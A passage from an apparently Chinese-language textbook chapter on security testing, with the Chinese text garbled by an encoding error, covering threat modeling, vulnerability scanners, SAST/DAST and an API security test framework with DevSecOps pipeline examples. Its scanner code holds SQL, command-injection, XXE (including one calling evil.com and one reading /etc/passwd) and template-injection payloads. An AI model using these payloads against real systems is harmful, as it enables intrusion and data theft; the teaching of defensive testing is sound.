   - æœ€å¤§åŒ–æ¼æ´å‘ç°æ•ˆç‡

å®è·µå»ºè®®ï¼š
- ä»ç°ç›’å¼€å§‹ï¼Œè¿™æ˜¯æœ€å®ç”¨çš„
- å¯¹å…³é”®éƒ¨åˆ†è¾…ä»¥ç™½ç›’æŠ€æœ¯
- æŒç»­è¿è¡Œï¼Œé•¿æœŸæ”¶ç›Šæ˜æ˜¾
- æŠ•èµ„äºåŸºç¡€è®¾æ–½è‡ªåŠ¨åŒ–

</details>

### è¿›ä¸€æ­¥ç ”ç©¶

1. å¦‚ä½•è®¾è®¡ä¸€ä¸ªè‡ªé€‚åº”çš„æ¨¡ç³Šæµ‹è¯•å™¨ï¼Œèƒ½å¤Ÿæ ¹æ®ç›®æ ‡ç¨‹åºç‰¹å¾è‡ªåŠ¨é€‰æ‹©æœ€ä¼˜ç­–ç•¥ï¼Ÿ
2. é‡å­è®¡ç®—å¯¹æ¨¡ç³Šæµ‹è¯•æ•ˆç‡çš„æ½œåœ¨å½±å“æ˜¯ä»€ä¹ˆï¼Ÿ
3. å¦‚ä½•å°†å› æœæ¨ç†åº”ç”¨äºæ¨¡ç³Šæµ‹è¯•çš„å´©æºƒåˆ†æï¼Ÿ

## 17.3 å®‰å…¨æµ‹è¯•æ–¹æ³•è®º

### 17.3.1 å¨èƒå»ºæ¨¡

å®‰å…¨æµ‹è¯•å§‹äºç†è§£ç³»ç»Ÿé¢ä¸´çš„å¨èƒã€‚å¨èƒå»ºæ¨¡æ˜¯è¯†åˆ«ã€è¯„ä¼°å’Œä¼˜å…ˆå¤„ç†å®‰å…¨é£é™©çš„ç³»ç»ŸåŒ–æ–¹æ³•ã€‚

```python
class ThreatModeling:
    def __init__(self, system):
        self.system = system
        self.assets = []
        self.threats = []
        self.vulnerabilities = []
        self.mitigations = []
    
    def stride_analysis(self):
        """STRIDEå¨èƒåˆ†ç±»æ³•"""
        stride_categories = {
            'Spoofing': 'èº«ä»½ä¼ªé€ ',
            'Tampering': 'æ•°æ®ç¯¡æ”¹',
            'Repudiation': 'å¦è®¤æ€§',
            'Information_Disclosure': 'ä¿¡æ¯æ³„éœ²',
            'Denial_of_Service': 'æ‹’ç»æœåŠ¡',
            'Elevation_of_Privilege': 'æƒé™æå‡'
        }
        
        threats = []
        for component in self.system.components:
            for category, description in stride_categories.items():
                threat = self.analyze_threat(component, category)
                if threat:
                    threats.append({
                        'component': component,
                        'category': category,
                        'description': description,
                        'risk_level': threat.risk_level,
                        'mitigations': threat.mitigations
                    })
        
        return threats
    
    def data_flow_analysis(self):
        """æ•°æ®æµå›¾åˆ†æ"""
        # è¯†åˆ«ä¿¡ä»»è¾¹ç•Œ
        trust_boundaries = self.identify_trust_boundaries()
        
        # åˆ†æè·¨è¾¹ç•Œçš„æ•°æ®æµ
        risky_flows = []
        for flow in self.system.data_flows:
            if self.crosses_trust_boundary(flow, trust_boundaries):
                risks = self.analyze_flow_risks(flow)
                risky_flows.append({
                    'flow': flow,
                    'risks': risks,
                    'priority': self.calculate_priority(risks)
                })
        
        return risky_flows
```

**æ”»å‡»æ ‘åˆ†æ**ï¼š

```python
class AttackTree:
    def __init__(self, goal):
        self.root = AttackNode(goal)
        self.nodes = [self.root]
    
    def build_tree(self):
        """æ„å»ºæ”»å‡»æ ‘"""
        # ç¤ºä¾‹ï¼šSQLæ³¨å…¥æ”»å‡»æ ‘
        sql_injection = AttackNode("æ‰§è¡ŒSQLæ³¨å…¥")
        
        # å­ç›®æ ‡
        find_input = AttackNode("æ‰¾åˆ°æ³¨å…¥ç‚¹")
        bypass_filter = AttackNode("ç»•è¿‡è¾“å…¥è¿‡æ»¤")
        extract_data = AttackNode("æå–æ•°æ®")
        
        # å¯»æ‰¾æ³¨å…¥ç‚¹çš„æ–¹æ³•
        find_input.add_child(AttackNode("æµ‹è¯•ç™»å½•è¡¨å•"))
        find_input.add_child(AttackNode("æµ‹è¯•æœç´¢åŠŸèƒ½"))
        find_input.add_child(AttackNode("æµ‹è¯•URLå‚æ•°"))
        
        # ç»•è¿‡è¿‡æ»¤çš„æ–¹æ³•
        bypass_filter.add_child(AttackNode("ä½¿ç”¨ç¼–ç "))
        bypass_filter.add_child(AttackNode("ä½¿ç”¨æ³¨é‡Š"))
        bypass_filter.add_child(AttackNode("ä½¿ç”¨å¤§å°å†™å˜åŒ–"))
        
        sql_injection.add_children([find_input, bypass_filter, extract_data])
        
        return sql_injection
    
    def calculate_attack_cost(self, node):
        """è®¡ç®—æ”»å‡»æˆæœ¬"""
        if node.is_leaf():
            return node.cost
        
        if node.is_and_node():
            # ANDèŠ‚ç‚¹ï¼šéœ€è¦æ‰€æœ‰å­èŠ‚ç‚¹
            return sum(self.calculate_attack_cost(child) 
                      for child in node.children)
        else:
            # ORèŠ‚ç‚¹ï¼šé€‰æ‹©æœ€ä½æˆæœ¬è·¯å¾„
            return min(self.calculate_attack_cost(child) 
                      for child in node.children)
```

### 17.3.2 æ¼æ´æ‰«æå’Œæ¸—é€æµ‹è¯•

è‡ªåŠ¨åŒ–çš„æ¼æ´æ‰«æç»“åˆæ‰‹åŠ¨æ¸—é€æµ‹è¯•ï¼š

```python
class VulnerabilityScanner:
    def __init__(self):
        self.scan_modules = {
            'web': WebVulnerabilityScanner(),
            'network': NetworkScanner(),
            'application': ApplicationScanner(),
            'configuration': ConfigurationScanner()
        }
        
    def comprehensive_scan(self, target):
        """å…¨é¢æ‰«æ"""
        results = {
            'vulnerabilities': [],
            'risks': [],
            'recommendations': []
        }
        
        # ä¿¡æ¯æ”¶é›†
        recon_data = self.reconnaissance(target)
        
        # æ¼æ´æ‰«æ
        for module_name, scanner in self.scan_modules.items():
            scan_results = scanner.scan(target, recon_data)
            results['vulnerabilities'].extend(scan_results)
        
        # é£é™©è¯„ä¼°
        results['risks'] = self.assess_risks(results['vulnerabilities'])
        
        # ç”Ÿæˆå»ºè®®
        results['recommendations'] = self.generate_recommendations(results)
        
        return results

class WebVulnerabilityScanner:
    def scan(self, target, recon_data):
        vulnerabilities = []
        
        # OWASP Top 10æ£€æµ‹
        checks = [
            self.check_injection,
            self.check_broken_auth,
            self.check_sensitive_data,
            self.check_xxe,
            self.check_access_control,
            self.check_misconfig,
            self.check_xss,
            self.check_deserialization,
            self.check_components,
            self.check_logging
        ]
        
        for check in checks:
            vulns = check(target)
            vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    def check_injection(self, target):
        """æ£€æµ‹æ³¨å…¥æ¼æ´"""
        injection_tests = []
        
        # SQLæ³¨å…¥æµ‹è¯•
        sql_payloads = [
            "' OR '1'='1",
            "1' AND '1'='2",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--"
        ]
        
        # NoSQLæ³¨å…¥æµ‹è¯•
        nosql_payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$where": "sleep(1000)"}'
        ]
        
        # å‘½ä»¤æ³¨å…¥æµ‹è¯•
        cmd_payloads = [
            '; ls -la',
            '| whoami',
            '`id`',
            '$(cat /etc/passwd)'
        ]
        
        vulnerabilities = []
        for endpoint in target.endpoints:
            for param in endpoint.parameters:
                # æµ‹è¯•å„ç§æ³¨å…¥
                if self.test_sql_injection(endpoint, param, sql_payloads):
                    vulnerabilities.append({
                        'type': 'SQL Injection',
                        'endpoint': endpoint,
                        'parameter': param,
                        'severity': 'Critical'
                    })
                
        return vulnerabilities
```

### 17.3.3 é™æ€åº”ç”¨å®‰å…¨æµ‹è¯•ï¼ˆSASTï¼‰

æºä»£ç çº§åˆ«çš„å®‰å…¨åˆ†æï¼š

```python
class StaticSecurityAnalyzer:
    def __init__(self):
        self.rules = SecurityRules()
        self.taint_analyzer = TaintAnalyzer()
        self.crypto_analyzer = CryptoAnalyzer()
        
    def analyze_source_code(self, source_files):
        """åˆ†ææºä»£ç å®‰å…¨é—®é¢˜"""
        findings = []
        
        for file in source_files:
            # è§£æAST
            ast = self.parse_file(file)
            
            # æ±¡ç‚¹åˆ†æ
            taint_issues = self.taint_analyzer.analyze(ast)
            findings.extend(taint_issues)
            
            # è§„åˆ™åŒ¹é…
            rule_violations = self.check_security_rules(ast)
            findings.extend(rule_violations)
            
            # å¯†ç å­¦åˆ†æ
            crypto_issues = self.crypto_analyzer.analyze(ast)
            findings.extend(crypto_issues)
            
        return self.prioritize_findings(findings)
    
    def check_security_rules(self, ast):
        """æ£€æŸ¥å®‰å…¨è§„åˆ™è¿å"""
        violations = []
        
        # ç¡¬ç¼–ç å¯†é’¥æ£€æµ‹
        hardcoded_secrets = self.find_hardcoded_secrets(ast)
        violations.extend(hardcoded_secrets)
        
        # ä¸å®‰å…¨çš„éšæœºæ•°ç”Ÿæˆ
        weak_random = self.find_weak_random(ast)
        violations.extend(weak_random)
        
        # ä¸å®‰å…¨çš„ååºåˆ—åŒ–
        unsafe_deserial = self.find_unsafe_deserialization(ast)
        violations.extend(unsafe_deserial)
        
        return violations

class TaintAnalyzer:
    def __init__(self):
        self.sources = ['user_input', 'request', 'file_read']
        self.sinks = ['sql_query', 'system_call', 'file_write']
        self.sanitizers = ['escape', 'validate', 'parameterize']
    
    def analyze(self, ast):
        """æ±¡ç‚¹åˆ†æ"""
        taint_graph = self.build_taint_graph(ast)
        
        vulnerabilities = []
        for source in self.sources:
            for sink in self.sinks:
                paths = self.find_taint_paths(taint_graph, source, sink)
                
                for path in paths:
                    if not self.is_sanitized(path):
                        vulnerabilities.append({
                            'type': 'Taint Flow',
                            'source': source,
                            'sink': sink,
                            'path': path,
                            'severity': self.calculate_severity(source, sink)
                        })
        
        return vulnerabilities
```

### 17.3.4 åŠ¨æ€åº”ç”¨å®‰å…¨æµ‹è¯•ï¼ˆDASTï¼‰

è¿è¡Œæ—¶çš„å®‰å…¨æµ‹è¯•ï¼š

```python
class DynamicSecurityTester:
    def __init__(self):
        self.proxy = InterceptingProxy()
        self.fuzzer = SecurityFuzzer()
        self.monitor = RuntimeMonitor()
        
    def test_running_application(self, app_url):
        """æµ‹è¯•è¿è¡Œä¸­çš„åº”ç”¨"""
        # çˆ¬è™«å‘ç°ç«¯ç‚¹
        endpoints = self.crawl_application(app_url)
        
        # å»ºç«‹åŸºçº¿
        baseline = self.establish_baseline(endpoints)
        
        # ä¸»åŠ¨æ‰«æ
        vulnerabilities = []
        for endpoint in endpoints:
            # è®¤è¯æµ‹è¯•
            auth_issues = self.test_authentication(endpoint)
            vulnerabilities.extend(auth_issues)
            
            # ä¼šè¯ç®¡ç†æµ‹è¯•
            session_issues = self.test_session_management(endpoint)
            vulnerabilities.extend(session_issues)
            
            # è¾“å…¥éªŒè¯æµ‹è¯•
            input_issues = self.test_input_validation(endpoint)
            vulnerabilities.extend(input_issues)
            
            # ä¸šåŠ¡é€»è¾‘æµ‹è¯•
            logic_issues = self.test_business_logic(endpoint)
            vulnerabilities.extend(logic_issues)
        
        return vulnerabilities
    
    def test_authentication(self, endpoint):
        """è®¤è¯æœºåˆ¶æµ‹è¯•"""
        issues = []
        
        # å¼±å¯†ç æµ‹è¯•
        weak_passwords = ['admin', 'password', '123456']
        for password in weak_passwords:
            if self.try_login(endpoint, 'admin', password):
                issues.append({
                    'type': 'Weak Password',
                    'endpoint': endpoint,
                    'credentials': f'admin:{password}'
                })
        
        # æš´åŠ›ç ´è§£é˜²æŠ¤æµ‹è¯•
        if not self.has_rate_limiting(endpoint):
            issues.append({
                'type': 'No Rate Limiting',
                'endpoint': endpoint,
                'risk': 'Brute Force Attack'
            })
        
        # å¤šå› ç´ è®¤è¯æ£€æŸ¥
        if not self.has_mfa(endpoint):
            issues.append({
                'type': 'No MFA',
                'endpoint': endpoint,
                'recommendation': 'Implement MFA'
            })
        
        return issues
```

### ç»ƒä¹  17.3

1. **è®¾è®¡é¢˜**ï¼šè®¾è®¡ä¸€ä¸ªAPIå®‰å…¨æµ‹è¯•æ¡†æ¶ã€‚

<details>
<summary>å‚è€ƒç­”æ¡ˆ</summary>

APIå®‰å…¨æµ‹è¯•æ¡†æ¶è®¾è®¡ï¼š

```python
import requests
import json
import jwt
import time
from typing import List, Dict, Any

class APISecurityTestFramework:
    def __init__(self, api_spec):
        self.api_spec = api_spec  # OpenAPI/Swaggerè§„èŒƒ
        self.endpoints = self.parse_api_spec(api_spec)
        self.test_results = []
        self.auth_tokens = {}
        
    def run_security_tests(self):
        """è¿è¡Œå®Œæ•´çš„å®‰å…¨æµ‹è¯•å¥—ä»¶"""
        print("Starting API Security Testing...")
        
        # 1. è®¤è¯å’Œæˆæƒæµ‹è¯•
        self.test_authentication_authorization()
        
        # 2. è¾“å…¥éªŒè¯æµ‹è¯•
        self.test_input_validation()
        
        # 3. æ³¨å…¥æ”»å‡»æµ‹è¯•
        self.test_injection_attacks()
        
        # 4. ä¸šåŠ¡é€»è¾‘æµ‹è¯•
        self.test_business_logic()
        
        # 5. é€Ÿç‡é™åˆ¶å’ŒDoSæµ‹è¯•
        self.test_rate_limiting()
        
        # 6. æ•°æ®æš´éœ²æµ‹è¯•
        self.test_data_exposure()
        
        # 7. CORSå’Œå®‰å…¨å¤´æµ‹è¯•
        self.test_security_headers()
        
        # ç”ŸæˆæŠ¥å‘Š
        return self.generate_report()
    
    def test_authentication_authorization(self):
        """æµ‹è¯•è®¤è¯å’Œæˆæƒæœºåˆ¶"""
        tests = []
        
        # JWTæµ‹è¯•
        if self.uses_jwt():
            tests.extend(self.test_jwt_vulnerabilities())
        
        # OAuthæµ‹è¯•
        if self.uses_oauth():
            tests.extend(self.test_oauth_vulnerabilities())
        
        # æƒé™æµ‹è¯•
        tests.extend(self.test_authorization_bypasses())
        
        self.test_results.extend(tests)
    
    def test_jwt_vulnerabilities(self):
        """JWTç›¸å…³æ¼æ´æµ‹è¯•"""
        vulnerabilities = []
        
        # 1. ç®—æ³•æ··æ·†æ”»å‡»
        test_tokens = [
            # Noneç®—æ³•
            self.create_jwt_none_algorithm(),
            # å¼±å¯†é’¥
            self.create_jwt_weak_key(),
            # ç®—æ³•é™çº§
            self.create_jwt_algorithm_confusion()
        ]
        
        for token in test_tokens:
            if self.verify_malicious_jwt(token):
                vulnerabilities.append({
                    'type': 'JWT Vulnerability',
                    'description': 'JWT validation bypass',
                    'severity': 'Critical',
                    'details': token['description']
                })
        
        # 2. å¯†é’¥æ³„éœ²æµ‹è¯•
        if self.check_jwt_key_exposure():
            vulnerabilities.append({
                'type': 'JWT Key Exposure',
                'severity': 'Critical'
            })
        
        return vulnerabilities
    
    def test_authorization_bypasses(self):
        """æµ‹è¯•æˆæƒç»•è¿‡"""
        bypasses = []
        
        # IDOR (ä¸å®‰å…¨çš„ç›´æ¥å¯¹è±¡å¼•ç”¨)
        for endpoint in self.endpoints:
            if self.has_resource_ids(endpoint):
                idor_results = self.test_idor(endpoint)
                bypasses.extend(idor_results)
        
        # æ°´å¹³æƒé™è¶Šæƒ
        horizontal_results = self.test_horizontal_privilege_escalation()
        bypasses.extend(horizontal_results)
        
        # å‚ç›´æƒé™è¶Šæƒ
        vertical_results = self.test_vertical_privilege_escalation()
        bypasses.extend(vertical_results)
        
        return bypasses
    
    def test_input_validation(self):
        """è¾“å…¥éªŒè¯æµ‹è¯•"""
        for endpoint in self.endpoints:
            # æµ‹è¯•æ¯ä¸ªå‚æ•°
            for param in endpoint.parameters:
                self.test_parameter_validation(endpoint, param)
    
    def test_parameter_validation(self, endpoint, param):
        """æµ‹è¯•å•ä¸ªå‚æ•°çš„éªŒè¯"""
        test_cases = []
        
        # æ ¹æ®å‚æ•°ç±»å‹ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹
        if param.type == 'string':
            test_cases.extend([
                # è¶…é•¿å­—ç¬¦ä¸²
                'A' * 10000,
                # ç‰¹æ®Šå­—ç¬¦
                '!@#$%^&*()<>?:"{}[]\\|',
                # Unicode
                'æµ‹è¯•\u0000\uffff',
                # ç©ºå€¼
                '', None,
                # æ ¼å¼è¿å
                'not_an_email' if param.format == 'email' else None
            ])
        elif param.type == 'integer':
            test_cases.extend([
                # è¾¹ç•Œå€¼
                -2147483648, 2147483647,
                # ç±»å‹é”™è¯¯
                'not_a_number', 3.14,
                # ç‰¹æ®Šå€¼
                0, -1, None
            ])
        elif param.type == 'array':
            test_cases.extend([
                # ç©ºæ•°ç»„
                [],
                # è¶…å¤§æ•°ç»„
                list(range(10000)),
                # åµŒå¥—æ•°ç»„
                [[[[[]]]]]
            ])
        
        # æ‰§è¡Œæµ‹è¯•
        for test_value in test_cases:
            response = self.send_request(endpoint, {param.name: test_value})
            self.analyze_validation_response(endpoint, param, test_value, response)
    
    def test_injection_attacks(self):
        """æ³¨å…¥æ”»å‡»æµ‹è¯•"""
        injection_payloads = {
            'sql': [
                "' OR '1'='1",
                "'; DROP TABLE users--",
                "' UNION SELECT * FROM information_schema.tables--",
                "1' AND SLEEP(5)--"
            ],
            'nosql': [
                '{"$ne": null}',
                '{"$where": "this.password == this.username"}',
                '{"$regex": ".*"}',
                '{"$gt": ""}'
            ],
            'command': [
                '; cat /etc/passwd',
                '| whoami',
                '`sleep 5`',
                '$(pwd)'
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>'
            ],
            'template': [
                '{{7*7}}',
                '${7*7}',
                '<%= 7*7 %>',
                '#{7*7}'
            ]
        }
        
        for endpoint in self.endpoints:
            for param in endpoint.parameters:
                for attack_type, payloads in injection_payloads.items():
                    for payload in payloads:
                        self.test_injection(endpoint, param, attack_type, payload)
    
    def test_business_logic(self):
        """ä¸šåŠ¡é€»è¾‘æµ‹è¯•"""
        # ä»·æ ¼æ“çºµ
        self.test_price_manipulation()
        
        # å·¥ä½œæµç»•è¿‡
        self.test_workflow_bypass()
        
        # ç«æ€æ¡ä»¶
        self.test_race_conditions()
        
        # é‡æ”¾æ”»å‡»
        self.test_replay_attacks()
    
    def test_race_conditions(self):
        """æµ‹è¯•ç«æ€æ¡ä»¶"""
        import threading
        
        # å¹¶å‘ä¼˜æƒ åˆ¸ä½¿ç”¨
        def use_coupon(coupon_code, results):
            response = self.send_request(
                '/api/apply-coupon',
                {'code': coupon_code}
            )
            results.append(response)
        
        # å¹¶å‘æ‰§è¡Œ
        results = []
        threads = []
        coupon_code = 'TESTCOUPON'
        
        for _ in range(10):
            t = threading.Thread(target=use_coupon, args=(coupon_code, results))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        # åˆ†æç»“æœ
        success_count = sum(1 for r in results if r.status_code == 200)
        if success_count > 1:
            self.test_results.append({
                'type': 'Race Condition',
                'endpoint': '/api/apply-coupon',
                'description': f'Coupon used {success_count} times',
                'severity': 'High'
            })
    
    def test_rate_limiting(self):
        """æµ‹è¯•é€Ÿç‡é™åˆ¶"""
        endpoints_to_test = [
            '/api/login',
            '/api/password-reset',
            '/api/register'
        ]
        
        for endpoint in endpoints_to_test:
            # å‘é€å¤§é‡è¯·æ±‚
            start_time = time.time()
            responses = []
            
            for i in range(100):
                response = self.send_request(endpoint, {
                    'username': f'user{i}',
                    'password': 'password'
                })
                responses.append(response)
                
                if response.status_code == 429:  # Too Many Requests
                    break
            
            # åˆ†æç»“æœ
            if not any(r.status_code == 429 for r in responses):
                self.test_results.append({
                    'type': 'No Rate Limiting',
                    'endpoint': endpoint,
                    'severity': 'Medium',
                    'requests_sent': len(responses)
                })
    
    def test_data_exposure(self):
        """æµ‹è¯•æ•°æ®æš´éœ²"""
        # å“åº”ä¸­çš„æ•æ„Ÿæ•°æ®
        sensitive_patterns = [
            r'"password":\s*"[^"]+",',
            r'"ssn":\s*"[^"]+",',
            r'"credit_card":\s*"[^"]+",',
            r'"api_key":\s*"[^"]+",',
            r'"token":\s*"[^"]+",',
        ]
        
        # é”™è¯¯æ¶ˆæ¯ä¸­çš„ä¿¡æ¯æ³„éœ²
        error_triggers = [
            {'param': 'id', 'value': '99999999'},
            {'param': 'email', 'value': 'nonexistent@test.com'},
        ]
        
        for endpoint in self.endpoints:
            # æ­£å¸¸è¯·æ±‚
            response = self.send_valid_request(endpoint)
            
            # æ£€æŸ¥æ•æ„Ÿæ•°æ®
            for pattern in sensitive_patterns:
                if re.search(pattern, response.text):
                    self.test_results.append({
                        'type': 'Sensitive Data Exposure',
                        'endpoint': endpoint.path,
                        'pattern': pattern,
                        'severity': 'High'
                    })
            
            # è§¦å‘é”™è¯¯
            for trigger in error_triggers:
                error_response = self.send_request(endpoint, trigger)
                if self.contains_stack_trace(error_response):
                    self.test_results.append({
                        'type': 'Information Disclosure',
                        'endpoint': endpoint.path,
                        'description': 'Stack trace in error response',
                        'severity': 'Medium'
                    })
    
    def test_security_headers(self):
        """æµ‹è¯•å®‰å…¨å¤´"""
        required_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=',
            'Content-Security-Policy': None  # åªæ£€æŸ¥å­˜åœ¨æ€§
        }
        
        # CORSæµ‹è¯•
        cors_tests = [
            {'origin': 'https://evil.com'},
            {'origin': 'null'},
            {'origin': '*'}
        ]
        
        for endpoint in self.endpoints:
            response = self.send_request(endpoint)
            
            # æ£€æŸ¥å®‰å…¨å¤´
            for header, expected in required_headers.items():
                actual = response.headers.get(header)
                if not actual:
                    self.test_results.append({
                        'type': 'Missing Security Header',
                        'header': header,
                        'endpoint': endpoint.path
                    })
                elif expected and not self.header_matches(actual, expected):
                    self.test_results.append({
                        'type': 'Incorrect Security Header',
                        'header': header,
                        'expected': expected,
                        'actual': actual
                    })
            
            # CORSæµ‹è¯•
            for cors_test in cors_tests:
                cors_response = self.send_request(
                    endpoint,
                    headers={'Origin': cors_test['origin']}
                )
                
                if cors_response.headers.get('Access-Control-Allow-Origin') == cors_test['origin']:
                    self.test_results.append({
                        'type': 'Insecure CORS',
                        'endpoint': endpoint.path,
                        'origin': cors_test['origin'],
                        'severity': 'High'
                    })
    
    def generate_report(self):
        """ç”Ÿæˆæµ‹è¯•æŠ¥å‘Š"""
        report = {
            'summary': {
                'total_endpoints': len(self.endpoints),
                'total_tests': len(self.test_results),
                'critical': sum(1 for t in self.test_results if t.get('severity') == 'Critical'),
                'high': sum(1 for t in self.test_results if t.get('severity') == 'High'),
                'medium': sum(1 for t in self.test_results if t.get('severity') == 'Medium'),
                'low': sum(1 for t in self.test_results if t.get('severity') == 'Low')
            },
            'findings': self.test_results,
            'recommendations': self.generate_recommendations()
        }
        
        return report
    
    def generate_recommendations(self):
        """ç”Ÿæˆä¿®å¤å»ºè®®"""
        recommendations = []
        
        # åŸºäºå‘ç°çš„é—®é¢˜ç”Ÿæˆå»ºè®®
        issue_types = set(t['type'] for t in self.test_results)
        
        recommendation_map = {
            'JWT Vulnerability': 'å®æ–½proper JWTéªŒè¯ï¼Œé¿å…ä½¿ç”¨noneç®—æ³•',
            'No Rate Limiting': 'å®æ–½é€Ÿç‡é™åˆ¶é˜²æ­¢æš´åŠ›ç ´è§£',
            'Injection': 'ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢å’Œè¾“å…¥éªŒè¯',
            'Missing Security Header': 'æ·»åŠ æ‰€æœ‰å¿…è¦çš„å®‰å…¨å“åº”å¤´',
            'Sensitive Data Exposure': 'é¿å…åœ¨å“åº”ä¸­è¿”å›æ•æ„Ÿæ•°æ®',
            'Race Condition': 'å®æ–½é€‚å½“çš„å¹¶å‘æ§åˆ¶å’Œé”æœºåˆ¶'
        }
        
        for issue_type in issue_types:
            if issue_type in recommendation_map:
                recommendations.append({
                    'issue': issue_type,
                    'recommendation': recommendation_map[issue_type]
                })
        
        return recommendations

# ä½¿ç”¨ç¤ºä¾‹
def run_api_security_test(api_spec_file):
    # åŠ è½½APIè§„èŒƒ
    with open(api_spec_file, 'r') as f:
        api_spec = json.load(f)
    
    # åˆ›å»ºæµ‹è¯•æ¡†æ¶
    framework = APISecurityTestFramework(api_spec)
    
    # è¿è¡Œæµ‹è¯•
    report = framework.run_security_tests()
    
    # è¾“å‡ºæŠ¥å‘Š
    print(json.dumps(report, indent=2))
    
    # ç”ŸæˆHTMLæŠ¥å‘Š
    generate_html_report(report, 'api_security_report.html')
```

è¿™ä¸ªæ¡†æ¶åŒ…å«ï¼š
1. å…¨é¢çš„APIå®‰å…¨æµ‹è¯•è¦†ç›–
2. è‡ªåŠ¨åŒ–çš„æ¼æ´æ£€æµ‹
3. ä¸šåŠ¡é€»è¾‘æµ‹è¯•
4. è¯¦ç»†çš„æŠ¥å‘Šç”Ÿæˆ
5. å¯æ‰©å±•çš„æ¶æ„

</details>

2. **å®è·µé¢˜**ï¼šå¦‚ä½•åœ¨DevSecOpsæµç¨‹ä¸­é›†æˆå®‰å…¨æµ‹è¯•ï¼Ÿ

<details>
<summary>å‚è€ƒç­”æ¡ˆ</summary>

DevSecOpsä¸­é›†æˆå®‰å…¨æµ‹è¯•çš„ç­–ç•¥ï¼š

```python
class DevSecOpsPipeline:
    def __init__(self):
        self.stages = {
            'plan': SecurityPlanning(),
            'code': SecureCoding(),
            'build': BuildSecurity(),
            'test': SecurityTesting(),
            'release': ReleaseSecurityX(),
            'deploy': DeploymentSecurity(),
            'operate': OperationalSecurity(),
            'monitor': SecurityMonitoring()
        }
    
    def implement_security_gates(self):
        """åœ¨æ¯ä¸ªé˜¶æ®µå®æ–½å®‰å…¨é—¨ç¦"""
        return {
            'pre_commit': self.pre_commit_checks(),
            'pull_request': self.pull_request_security(),
            'build_time': self.build_time_security(),
            'pre_deployment': self.pre_deployment_security(),
            'runtime': self.runtime_security()
        }

class SecurityIntegrationStrategy:
    def __init__(self):
        self.tools = self.select_security_tools()
        self.policies = self.define_security_policies()
    
    def shift_left_implementation(self):
        """å·¦ç§»å®‰å…¨å®è·µ"""
        return {
            # 1. IDEé›†æˆ
            'ide_integration': {
                'tools': ['SonarLint', 'Snyk IDE Plugin'],
                'real_time_feedback': True,
                'auto_fix_suggestions': True
            },
            
            # 2. Pre-commité’©å­
            'pre_commit_hooks': {
                'secret_scanning': '''
                #!/bin/bash
                # .git/hooks/pre-commit
                
                # å¯†é’¥æ‰«æ
                if git diff --cached --name-only | xargs grep -E "(api_key|password|secret)" ; then
                    echo "Potential secret detected!"
                    exit 1
                fi
                
                # ä¾èµ–æ£€æŸ¥
                if [ -f "package-lock.json" ]; then
                    npm audit --audit-level=high
                    if [ $? -ne 0 ]; then
                        echo "High severity vulnerabilities found!"
                        exit 1
                    fi
                fi
                ''',
                
                'code_quality': '''
                # è¿è¡Œlinter
                eslint $(git diff --cached --name-only --diff-filter=ACM | grep ".js$")
                
                # è¿è¡Œå®‰å…¨linter
                bandit -r $(git diff --cached --name-only --diff-filter=ACM | grep ".py$")
                '''
            }
        }
    
    def ci_pipeline_integration(self):
        """CIç®¡é“é›†æˆ"""
        return '''
# .gitlab-ci.yml ç¤ºä¾‹
stages:
  - build
  - test
  - security-scan
  - deploy

variables:
  DOCKER_DRIVER: overlay2

# SAST - é™æ€åº”ç”¨å®‰å…¨æµ‹è¯•
sast:
  stage: security-scan
  image: 
    name: "registry.gitlab.com/gitlab-org/security-products/sast:latest"
  script:
    - /analyzer run
  artifacts:
    reports:
      sast: gl-sast-report.json
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

# ä¾èµ–æ‰«æ
dependency_scanning:
  stage: security-scan
  image: 
    name: "registry.gitlab.com/gitlab-org/security-products/dependency-scanning:latest"
  script:
    - /analyzer run
  artifacts:
    reports:
      dependency_scanning: gl-dependency-scanning-report.json

# å®¹å™¨æ‰«æ
container_scanning:
  stage: security-scan
  image:
    name: "registry.gitlab.com/gitlab-org/security-products/analyzers/klar:latest"
  variables:
    CLAIR_DB_IMAGE_TAG: "latest"
    DOCKERFILE_PATH: "$CI_PROJECT_DIR/Dockerfile"
  script:
    - /analyzer run
  artifacts:
    reports:
      container_scanning: gl-container-scanning-report.json

# åŠ¨æ€å®‰å…¨æµ‹è¯• (DAST)
dast:
  stage: security-scan
  image: owasp/zap2docker-stable
  variables:
    DAST_WEBSITE: "https://staging.example.com"
  script:
    - |
      zap-baseline.py \
        -t $DAST_WEBSITE \
        -r zap-report.html \
        -J zap-report.json
  artifacts:
    paths:
      - zap-report.html
      - zap-report.json
  only:
    - branches
  except:
    - master

# å¯†é’¥æ‰«æ
secret_detection:
  stage: security-scan
  image: trufflesecurity/trufflehog:latest
  script:
    - trufflehog --regex --entropy=False --json git file://./
  allow_failure: false

# è®¸å¯è¯åˆè§„æ£€æŸ¥
license_scanning:
  stage: security-scan
  image: 
    name: "registry.gitlab.com/gitlab-org/security-products/license-finder:latest"
  script:
    - /analyzer run
  artifacts:
    reports:
      license_scanning: gl-license-scanning-report.json

# å®‰å…¨ç­–ç•¥éªŒè¯
security_policy_check:
  stage: security-scan
  script:
    - |
      # æ£€æŸ¥å®‰å…¨åˆ†æ•°
      SECURITY_SCORE=$(calculate_security_score)
      if [ $SECURITY_SCORE -lt 80 ]; then
        echo "Security score too low: $SECURITY_SCORE"
        exit 1
      fi
      
      # æ£€æŸ¥å…³é”®æ¼æ´
      CRITICAL_VULNS=$(jq '.vulnerabilities | map(select(.severity == "Critical")) | length' gl-sast-report.json)
      if [ $CRITICAL_VULNS -gt 0 ]; then
        echo "Critical vulnerabilities found: $CRITICAL_VULNS"
        exit 1
      fi
'''
    
    def kubernetes_security(self):
        """Kuberneteséƒ¨ç½²å®‰å…¨"""
        return {
            'admission_controllers': '''
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
